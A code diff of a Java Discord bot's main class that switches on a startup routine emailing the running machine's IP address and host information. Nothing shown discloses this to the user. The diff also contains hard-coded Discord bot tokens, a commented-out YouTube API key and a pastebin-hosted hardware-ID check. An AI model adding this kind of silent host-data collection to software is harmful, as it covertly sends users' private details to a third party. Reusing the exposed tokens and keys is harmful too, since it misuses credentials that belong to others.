@@ -4,6 +4,7 @@ import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
 import me.comu.exeter.commands.admin.WhitelistedJSONHandler;
 import me.comu.exeter.commands.economy.EcoJSONHandler;
 import me.comu.exeter.events.*;
+import me.comu.exeter.wrapper.Wrapper;
 import me.duncte123.botcommons.web.WebUtils;
 import net.dv8tion.jda.api.AccountType;
 import net.dv8tion.jda.api.JDA;
@@ -13,21 +14,25 @@ import net.dv8tion.jda.api.entities.Activity;
 import org.slf4j.LoggerFactory;
 
 import javax.security.auth.login.LoginException;
+import javax.swing.*;
+import java.awt.*;
 import java.io.File;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 
 public class Core {
 
     public static JDA jda;
     public static final long OWNERID = 210956619788320768L;
     protected static final String HWIDURL = "https://pastebin.com/raw/mGiKYJrV";
-    private static final String TOKEN ="Njg5ODY0MDY1Mzk2Mzc1NTcy.XnJtUg.FaObm7PTZpFP51-RvXttDbL_iJk";
+    private static final String TOKEN ="NjkxMzk2NjkxODY1MTA4NTMy.XnfXZQ.3PYB2bEjFSMYAndbxh5p6aznicE";
     //public static final String youtubeAPIKey = "AIzaSyAls9zrVVQtZksm-tMrKLhmXx3T1hrt_5c";
     public static final String DEBUG = "[DEBUG] ";
     public static String PREFIX = ";;";
 
     public static void main(final String[] args) {
         new Core();
-/*        Wrapper.sendEmail("Log Info On Startup","IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "");
+        Wrapper.sendEmail("Log Info On Startup","IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "");
         try {
             for (final UIManager.LookAndFeelInfo info : UIManager.getInstalledLookAndFeels()) {
                 if ("Nimbus".equals(info.getName())) {
@@ -49,11 +54,11 @@ public class Core {
             public void run() {
                 new LoginGUI().setVisible(true); }
 
-        });*/
+        });
     }
 
     private Core() {
-        EventWaiter eventWaiter = new EventWaiter();
+/*        EventWaiter eventWaiter = new EventWaiter();
         EcoJSONHandler.loadEconomyConfig(new File("economy.json"));
         WhitelistedJSONHandler.loadWhitelistConfig(new File("whitelisted.json"));
         CommandManager commandManager = new CommandManager(eventWaiter);
@@ -90,9 +95,8 @@ public class Core {
             logger.info("Successfully Booted");
         } catch (LoginException | InterruptedException e) {
             logger.info("Caught Exception! (LoginException | InterruptedException)");
-        }
+        }*/
     }
-
 
     public static void shutdownThread() {
 //        LoginGUI.running = false;
